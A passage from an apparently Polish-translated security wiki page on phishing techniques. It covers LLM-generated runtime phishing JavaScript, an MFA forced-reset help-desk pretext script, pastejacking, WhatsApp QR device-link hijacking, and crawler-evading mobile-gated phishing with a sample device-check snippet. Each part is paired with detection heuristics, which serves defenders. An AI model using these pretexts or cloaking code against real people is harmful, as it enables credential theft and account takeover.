4. **Phish/exfil:** wygenerowany code personalizuje przynętę (np. parsowanie tokenów LogoKit) i wysyła creds do prompt-hidden endpoint.

**Cechy evasji**
- Traffic trafia do dobrze znanych domen LLM lub renomowanych CDN proxy; czasem przez WebSockets do backendu.
- Brak statycznego payload; malicious JS istnieje tylko after render.
- Nondeterministic generations produkują **unique** stealers per session.

**Detection ideas**
- Uruchamiaj sandboxes z włączonym JS; flaguj **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Szukaj front-end POSTs do LLM APIs natychmiast followed by `eval`/`Function` na returned text.
- Alertuj o unsanctioned domenach LLM w client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **wymuszają nową rejestrację MFA** podczas help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, gdzie **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą po cichu kopiować złośliwe polecenia do schowka ofiary ze skompromitowanej lub typosquatted strony WWW, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub okno terminala, wykonując dowolny kod bez pobierania pliku czy załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Strona przynęta (np. fałszywy kanał ministry/CERT) wyświetla QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, cicho dodając atakującego jako **linked device**.
* Atakujący natychmiast zyskuje widoczność czatów/kontaktów do momentu usunięcia sesji. Ofiary mogą później zobaczyć powiadomienie o „new device linked”; defenderzy mogą szukać nieoczekiwanych zdarzeń device-link krótko po wejściach na niezaufane strony z QR.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatorzy coraz częściej blokują swoje przepływy phishingowe prostym checkiem urządzenia, aby desktopowe crawlers nigdy nie dotarły do końcowych stron. Częsty wzorzec to mały skrypt, który testuje DOM z obsługą dotyku i wysyła wynik do endpointu serwera; klienci inni niż mobile dostają HTTP 500 (albo pustą stronę), a użytkownicy mobile otrzymują pełny flow.

Minimal client snippet (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Zachowanie serwera często obserwowane:
- Ustawia cookie sesji podczas pierwszego ładowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) dla kolejnych `GET` przy `is_mobile=false`; serwuje phishing tylko jeśli `true`.

Heurystyki polowania i detekcji:
- zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria sieciowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla non-mobile; legalne ścieżki ofiary mobile zwracają 200 z następującym po tym HTML/JS.
- Blokuj lub dokładnie sprawdzaj strony, które warunkują treść wyłącznie na `ontouchstart` lub podobnych sprawdzeniach urządzenia.

Wskazówki obronne:
- Uruchamiaj crawlery z fingerprintami podobnymi do mobile i z włączonym JS, aby ujawnić treści za gate'em.
- Alarmuj o podejrzanych odpowiedziach 500 po `POST /detect` na nowo zarejestrowanych domenach.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
